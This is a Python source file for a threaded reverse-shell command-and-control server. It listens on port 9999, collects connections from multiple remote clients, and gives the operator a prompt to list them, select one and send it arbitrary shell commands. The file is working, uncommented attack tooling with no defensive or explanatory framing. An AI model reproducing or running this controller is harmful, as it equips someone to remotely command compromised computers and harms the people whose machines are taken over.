import socket
import threading
from queue import Queue
import sys

NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2]
queue=Queue()
all_connections =[]
all_addresses=[]



# creating socket to connect two computer
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port= 9999
        s=socket.socket()
    except socket.error as msg:
        print("Socket error is "+str(msg))


# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("binding to port "+str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error "+str(msg) +" Retrying...")


#Accept from multiple clients and save in list
def accept_connection():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn,address=s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established: "+ address[0])
        except:
            print("Error accepting connection")





#interactive prompt for sending command remotely
def start_deamon():
    while True:
        cmd=input("deamon@trigger> ")
        if cmd=='list':
            list_connections()
            continue
        elif 'select' in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not found ")





#displays all conections
def list_connections():
    results=''
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results+=str(i) +"  "+str(all_addresses[i][0])+":"+str(all_addresses[i][1])+"\n"
    print("----------clients-----------\n")
    print(results)




#Select target client
def get_target(cmd):
    try:
        target=cmd.replace('select ','')
        target=int(target)
        conn=all_connections[target]
        print(f"You're now connected to {all_addresses[target][0]}")
        print(f"{all_addresses[target][0]}> ",end="")
        return conn
    except:
        print("Not a valid connection")
        return None





def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if cmd=='quit':
                break
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response=str(conn.recv(20480),"utf-8")
                print(client_response,end="")
        except:
            print("connection was lost.......")
            break



# create threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
         t=threading.Thread(target=work)
         t.daemon =True
         t.start()


#do next job in queue ( one handels connection ,other sends commands
def work():
    while True:
        x=queue.get()
        if x==1:
            socket_create()
            socket_bind()
            accept_connection()
        if x==2:
            start_deamon()
        queue.task_done()



#Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()



create_workers()
create_jobs()
